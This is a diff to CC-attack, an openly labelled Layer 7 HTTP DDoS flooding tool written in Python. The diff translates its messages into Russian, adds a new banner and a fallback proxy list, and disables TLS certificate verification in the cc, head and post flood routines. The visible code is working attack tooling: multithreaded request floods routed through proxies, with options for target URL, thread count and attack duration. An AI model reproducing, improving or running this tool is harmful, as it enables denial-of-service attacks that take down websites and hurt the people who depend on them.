@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 #Coded by L330n123
+#Translated to Russian, updated banner & built-in proxy.txt by DIDO
 #########################################
 #         Just a little change          #
 #                           -- L330n123 #
@@ -17,26 +18,45 @@ import os
 
 
 
-print ('''
-	   /////    /////    /////////////
-	  CCCCC/   CCCCC/   | CC-attack |/
-	 CC/      CC/       |-----------|/ 
-	 CC/      CC/       |  Layer 7  |/ 
-	 CC/////  CC/////   | ddos tool |/ 
-	  CCCCC/   CCCCC/   |___________|/
->--------------------------------------------->
-Version 3.7.1 (2022/3/24)
-                              C0d3d by L330n123 fix by dido
-┌─────────────────────────────────────────────┐
-│        Tos: Don't attack .gov website       │
-├─────────────────────────────────────────────┤
-│                 New stuff:                  │
-│          [+] Added Http Proxy Support       │
-│          [+] Optimization                   │
-│          [+] Changed Varible Name           │
-├─────────────────────────────────────────────┤
-│ Link: https://github.com/Leeon123/CC-attack │
-└─────────────────────────────────────────────┘''')
+print(r'''
+        ╔══════════════════════════════════════════════════════╗
+        ║                                                      ║
+        ║                ██████╗ ██████╗                      ║
+        ║               ██╔════╝██╔════╝                      ║
+        ║               ██║     ██║                           ║
+        ║               ██║     ██║                           ║
+        ║               ╚██████╗╚██████╗                      ║
+        ║                ╚═════╝ ╚═════╝                      ║
+        ║                                                      ║
+        ║        ⚡  C C - A T T A C K   L A Y E R 7  ⚡       ║
+        ║                                                      ║
+        ║                Версия 3.8.0 (2026/9/24)              ║
+        ║                       by DIDO                        ║
+        ║                                                      ║
+        ╠══════════════════════════════════════════════════════╣
+        ║      ⚠  Внимание: Не атакуйте .gov сайты  ⚠          ║
+        ╠══════════════════════════════════════════════════════╣
+        ║                     Новое:                           ║
+        ║          [+] Поддержка HTTP прокси                   ║
+        ║          [+] Оптимизация                             ║
+        ║          [+] Изменены имена переменных               ║
+        ║          [+] Добавлен русский язык                   ║
+        ║          [+] Встроенный список прокси                ║
+        ║          [+] Новый баннер (молния)                   ║
+        ╠══════════════════════════════════════════════════════╣
+        ║   Ссылка: https://github.com/Leeon123/CC-attack      ║
+        ╚══════════════════════════════════════════════════════╝
+
+                    ⚡  ⚡  ⚡  ⚡  ⚡  ⚡  ⚡  ⚡  ⚡  ⚡
+''')
+
+# Встроенный список прокси (если файл proxy.txt отсутствует)
+BUILTIN_PROXIES = [
+    "127.0.0.1:9050",  # Пример локального Tor прокси
+    "127.0.0.1:1080",  # Пример локального SOCKS5
+    "192.168.1.1:8080", # Пример локального HTTP прокси
+    # Добавьте свои прокси здесь
+]
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -201,7 +221,7 @@ def ParseUrl(original_url):
 		url = original_url[8:]
 		protocol = "https"
 	else:
-		print("> That looks like not a correct url.")
+		print("> Это не похоже на правильный URL.")
 		exit()
 	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
 	#print(url) #for debug
@@ -224,7 +244,7 @@ def InputOption(question,options,default):
 		if ans == "":
 			ans = default
 		elif ans not in options:
-			print("> Please enter the correct option")
+			print("> Пожалуйста, введите правильный вариант")
 			ans = ""
 			continue
 	return ans
@@ -250,7 +270,9 @@ def cc(event,proxy_type):
 			s.settimeout(3)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
-				ctx = ssl.SSLContext()
+				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(100):
@@ -287,7 +309,9 @@ def head(event,proxy_type):#HEAD MODE
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
-				ctx = ssl.SSLContext()
+				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(100):
@@ -320,7 +344,9 @@ def post(event,proxy_type):
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
-				ctx = ssl.SSLContext()
+				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(100):
@@ -449,23 +475,23 @@ def check_socks(ms):#Coded by Leeon123
 			th.start()
 		thread_list.append(th)
 		time.sleep(0.01)
-		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("> Проверено "+str(nums)+" прокси\r")
 		sys.stdout.flush()
 	for th in list(thread_list):
 		th.join()
-		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("> Проверено "+str(nums)+" прокси\r")
 		sys.stdout.flush()
-	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
+	print("\r\n> Все прокси проверены, рабочих:"+str(len(proxies)))
 	#ans = input("> Do u want to save them in a file? (y/n, default=y)")
 	#if ans == "y" or ans == "":
 	with open(out_file, 'wb') as fp:
 		for lines in list(proxies):
 			fp.write(bytes(lines,encoding='utf8'))
 		fp.close()
-	print("> They are saved in "+out_file)
+	print("> Они сохранены в "+out_file)
 			
 def check_list(socks_file):
-	print("> Checking list")
+	print("> Проверка списка")
 	temp = open(socks_file).readlines()
 	temp_list = []
 	for i in temp:
@@ -615,24 +641,24 @@ def DownloadProxies(proxy_ver):
 			except:
 				pass
 		f.close()
-	print("> Have already downloaded proxies list as "+out_file)
+	print("> Список прокси уже загружен как "+out_file)
 
 def PrintHelp():
-	print('''===============  CC-attack help list  ===============
-   -h/help   | showing this message
-   -url      | set target url
-   -m/mode   | set program mode
-   -data     | set post data path (only works on post mode)
-             | (Example: -data data.json)
-   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
-   -v        | set proxy type (4/5/http, default:5)
-   -t        | set threads number (default:800)
-   -f        | set proxies file (default:proxy.txt)
-   -b        | enable/disable brute mode
-             | Enable=1 Disable=0  (default:0)
-   -s        | set attack time(default:60)
-   -down     | download proxies
-   -check    | check proxies
+	print('''===============  CC-attack справка  ===============
+   -h/help   | показать это сообщение
+   -url      | установить целевой URL
+   -m/mode   | установить режим программы
+   -data     | установить путь к данным POST (только для режима post)
+             | (Пример: -data data.json)
+   -cookies  | установить cookies (Пример: 'id:xxx;ua:xxx')
+   -v        | установить тип прокси (4/5/http, по умолчанию:5)
+   -t        | установить количество потоков (по умолчанию:800)
+   -f        | установить файл прокси (по умолчанию:proxy.txt)
+   -b        | включить/выключить режим брутфорса
+             | Вкл=1 Выкл=0  (по умолчанию:0)
+   -s        | установить время атаки (по умолчанию:60)
+   -down     | скачать прокси
+   -check    | проверить прокси
 =====================================================''')
 
 
@@ -653,7 +679,7 @@ def main():
 	proxy_type = 5
 	period = 60
 	help = False
-	print("> Mode: [cc/post/head]")#slow]")
+	print("> Режим: [cc/post/head]")#slow]")
 	for n,args in enumerate(sys.argv):
 		if args == "-help" or args =="-h":
 			help =True
@@ -662,7 +688,7 @@ def main():
 		if args=="-m" or args=="-mode":
 			mode = sys.argv[n+1]
 			if mode not in ["cc","post","head"]:#,"slow"]:
-				print("> -m/-mode argument error")
+				print("> Ошибка аргумента -m/-mode")
 				return
 		if args =="-v":
 			proxy_ver = sys.argv[n+1]
@@ -673,7 +699,7 @@ def main():
 			elif proxy_ver == "http":
 				proxy_type = 0
 			elif proxy_ver not in ["4","5","http"]:
-				print("> -v argument error (only 4/5/http)")
+				print("> Ошибка аргумента -v (только 4/5/http)")
 				return
 		if args == "-b":
 			if sys.argv[n+1] == "1":
@@ -681,13 +707,13 @@ def main():
 			elif sys.argv[n+1] == "0":
 				brute = False
 			else:
-				print("> -b argument error")
+				print("> Ошибка аргумента -b")
 				return
 		if args == "-t":
 			try:
 				thread_num = int(sys.argv[n+1])
 			except:
-				print("> -t must be integer")
+				print("> -t должно быть целым числом")
 				return
 		if args == "-cookies":
 			cookies = sys.argv[n+1]
@@ -704,22 +730,25 @@ def main():
 			try:
 				period = int(sys.argv[n+1])
 			except:
-				print("> -s must be integer")
+				print("> -s должно быть целым числом")
 				return
 
 	if download_socks:
 		DownloadProxies(proxy_ver)
 
 	if os.path.exists(out_file)!=True:
-		print("Proxies file not found")
-		return
+		print("> Файл прокси не найден. Используем встроенный список.")
+		with open(out_file, 'w') as f:
+			for p in BUILTIN_PROXIES:
+				f.write(p + "\n")
+	
 	proxies = open(out_file).readlines()	
 	check_list(out_file)
 	proxies = open(out_file).readlines()	
 	if len(proxies) == 0:
-		print("> There are no more proxies. Please download a new proxies list.")
+		print("> Больше нет прокси. Пожалуйста, скачайте новый список.")
 		return
-	print ("> Number Of Proxies: %d" %(len(proxies)))
+	print ("> Количество прокси: %d" %(len(proxies)))
 	if check_proxies:
 		check_socks(3)
 
@@ -729,7 +758,7 @@ def main():
 		PrintHelp()
 
 	if target == "":
-		print("> There is no target. End of process ")
+		print("> Нет цели. Завершение процесса ")
 		return
 	'''
 	if mode == "slow":
@@ -738,12 +767,12 @@ def main():
 		th.start()
 	else:'''
 	event = threading.Event()
-	print("> Building threads...")
+	print("> Создание потоков...")
 	build_threads(mode,thread_num,event,proxy_type)
 	event.clear()
 	#input("Press Enter to continue.")
 	event.set()
-	print("> Flooding...")
+	print("> Флудим...")
 	time.sleep(period)
 
 if __name__ == "__main__":
